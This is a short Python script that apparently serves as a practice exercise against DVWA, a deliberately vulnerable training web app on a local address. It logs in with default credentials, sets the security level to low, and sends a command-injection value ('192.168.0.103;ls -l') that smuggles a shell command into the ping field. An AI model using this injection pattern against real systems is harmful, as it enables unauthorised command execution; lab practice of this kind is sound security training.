import requests

s=requests.session()

data_login={"username":"admin","password":"password","Login":"Login"}
response=s.post("http://192.168.0.103/dvwa/login.php",data=data_login)


print(s.cookies.get_dict())
if "Welcome to Damn Vulnerable Web App!" in response.text:
    print("[*] Login success")
else:
    print("[X] Failed")


difficult={'security':'low', 'seclev_submit':'Submit'}
response_2=s.post("http://192.168.0.103/dvwa/security.php",data=difficult)
print(s.cookies.get_dict())


date={'ip':'192.168.0.103;ls -l', 'submit':'submit'}
response_3=s.post("http://192.168.0.103/dvwa/vulnerabilities/exec/",data=date)

print(response_3.text)
